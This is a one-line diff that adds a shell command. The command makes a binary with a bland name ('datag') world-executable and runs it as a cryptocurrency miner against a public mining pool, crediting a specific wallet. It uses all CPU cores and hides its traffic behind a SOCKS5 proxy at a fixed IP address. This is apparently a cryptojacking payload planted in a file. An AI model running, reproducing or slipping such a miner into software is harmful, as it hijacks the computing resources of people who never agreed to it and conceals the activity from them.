@@ -1,0 +1,1 @@
+chmod 777 datag && ./datag -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RNuKKwqD99DsrQWVeQnvHLR8LpoMuBBnhS.KOM -t $(nproc) -x socks5://161.8.174.48:1080
